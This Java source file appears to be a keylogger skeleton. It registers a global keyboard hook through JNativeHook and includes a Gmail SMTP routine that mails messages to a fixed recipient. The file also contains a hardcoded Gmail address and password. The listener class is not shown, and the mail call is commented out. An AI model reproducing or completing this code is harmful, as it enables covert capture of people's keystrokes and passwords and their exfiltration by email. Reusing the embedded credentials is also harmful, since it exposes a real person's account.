import java.io.IOException;
import java.util.*;
import javax.mail.*;
import javax.mail.internet.*;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

public class SendEmail {

private static String USER_NAME = "i.touailaba.7@gmail.com";  // GMail user name (just the part before "@gmail.com")
private static String PASSWORD = "0649460498"; // GMail password

private static String RECIPIENT = "i.touailab007@gmail.com";

public static void main(String[] args) throws NativeHookException, IOException {
//    String from = USER_NAME;
//    String pass = PASSWORD;
//    String[] to = { RECIPIENT }; // list of recipient email addresses
//    String subject = "Java send mail example";
//    String body = "hi ....,!";
//
//    sendFromGMail(from, pass, to, subject, body);
  GlobalScreen.registerNativeHook();
   Read r = new Read();
   
   //GlobalScreen.addNativeKeyListener(r);
   GlobalScreen.getInstance().addNativeKeyListener(r);
    
   
System.out.println("fin");

}

private static void sendFromGMail(String from, String pass, String[] to, String subject, String body) {
    Properties props = System.getProperties();
  String host = "smtp.gmail.com";

    props.put("mail.smtp.starttls.enable", "true");

    props.put("mail.smtp.ssl.trust", host);
    props.put("mail.smtp.user", from);
    props.put("mail.smtp.password", pass);
    props.put("mail.smtp.port", "587");
    props.put("mail.smtp.auth", "true");


    //Session session = Session.getDefaultInstance(props);
    Session session = Session.getInstance(props, new javax.mail.Authenticator() {
        protected PasswordAuthentication getPasswordAuthentication() {
            return new PasswordAuthentication(USER_NAME, PASSWORD);
        }
    });
    MimeMessage message = new MimeMessage(session);

    try {


        message.setFrom(new InternetAddress(from));
        InternetAddress[] toAddress = new InternetAddress[to.length];

        // To get the array of addresses
        for( int i = 0; i < to.length; i++ ) {
            toAddress[i] = new InternetAddress(to[i]);
        }

        for( int i = 0; i < toAddress.length; i++) {
            message.addRecipient(Message.RecipientType.TO, toAddress[i]);
        }



        message.setSubject(subject);
        message.setText(body);


        Transport transport = session.getTransport("smtp");


        transport.connect(host, from, pass);
        transport.sendMessage(message, message.getAllRecipients());
        transport.close();
  
    }
    catch (AddressException ae) {
        ae.printStackTrace();
    }
    catch (MessagingException me) {
        me.printStackTrace();
    }
    }



   } 